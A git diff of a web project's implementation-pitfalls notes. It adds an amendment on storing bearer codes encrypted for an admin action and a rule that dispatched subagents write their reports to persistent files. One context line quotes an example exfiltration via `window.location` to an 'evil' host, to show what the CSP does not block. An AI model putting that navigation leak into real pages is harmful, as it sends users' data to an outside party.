@@ -16,6 +16,13 @@ reveals the raw code/link exactly ONCE at generation; it is unrecoverable afterw
 `code` column, or an admin list that rebuilds a `?code=` link per row, silently leaks live reusable
 bearer codes on any DB read/backup/export/Time-Travel restore.
 
+**AMENDED 2026-07-03 (owner-ratified):** lookup remains hash-only, but the raw code is ALSO
+stored AES-256-GCM-encrypted in `codes.code_enc` (key = the `CODE_VAULT_KEY` Worker secret,
+`src/lib/vault.ts`) to power the admin Show-link action — see
+`docs/design/2026-07-03-asset-manager-r2-and-recoverable-codes-design.md` §2. The invariant that
+survives: the raw code is NEVER stored in the clear, never logged, and appears in no response
+except show-once mint and the explicit Show-link action.
+
 ## Redemption is ONE atomic conditional UPDATE (spec §6 step 4)
 Validate + `use_count+1` + `last_used_at=unixepoch()` + compute `cookie_exp` in a SINGLE statement:
 `UPDATE codes SET use_count = use_count + 1, last_used_at = unixepoch() WHERE code_hash = ?1 AND
@@ -121,3 +128,25 @@ responses are byte-stable.
 The `'self'` CSP blocks background beaconing, NOT `window.location = 'https://evil/#'+body`.
 Accepted for trusted admin authoring, but §15 Q2 promotes sandboxed-iframe rendering to a
 recommended reconsideration — direct top-frame render is a conscious owner decision.
+
+---
+
+## Orchestration
+
+This section is the discovery hook for plan writers who arrive here via the `writing-plans-enhanced` (or equivalent) mandated-read path. The canonical rules live in `docs/git-strategy.md` → §Multi-agent coordination → Output persistence. This section does NOT restate those rules — it exists to make sure plan writers notice they apply.
+
+### ORCH-1: Analysis Dispatches Must Persist Findings Before Returning
+
+**Trigger:** Your plan dispatches parallel subagents (bug hunts, audits, phased analysis, parallel investigations) whose findings would be expensive to regenerate if lost.
+
+**What you need to do:** Every such dispatched subagent MUST write its complete report to a persistent file BEFORE returning; the response message is not the sole record.
+
+**Read the full rule:** `docs/git-strategy.md` → §Multi-agent coordination → Output persistence. That section carries the copy-pasteable prompt block (with `<PERSISTENCE_PATH>` substitution), file-path conventions, orchestrator commit cadence, and the cases where the rule doesn't apply.
+
+**Why this is in implementation-pitfalls:** because the plan-writing skill mandates reading this file, and this rule has to be noticed at plan-write time (when the dispatch prompts are being drafted), not at execution time (when it's too late). The failure mode — orchestrator context compacting mid-consolidation and lossily dropping findings — is predictable and preventable if the plan author builds persistence into the dispatch prompts from the start.
+
+### Review Checklist
+
+- [ ] **Dispatch prompts include the mandatory-persistence block** — copy from `docs/git-strategy.md` §Output persistence; substitute `<PERSISTENCE_PATH>` with a durable per-subagent path (ORCH-1)
+- [ ] **Plan specifies exact persistence paths, not "write somewhere useful"** — ambiguous paths default to `/tmp` under pressure, which doesn't survive (ORCH-1)
+- [ ] **Orchestrator commits subagent artifacts wave-by-wave** — committed files land on the campaign branch before consolidation begins (ORCH-1)
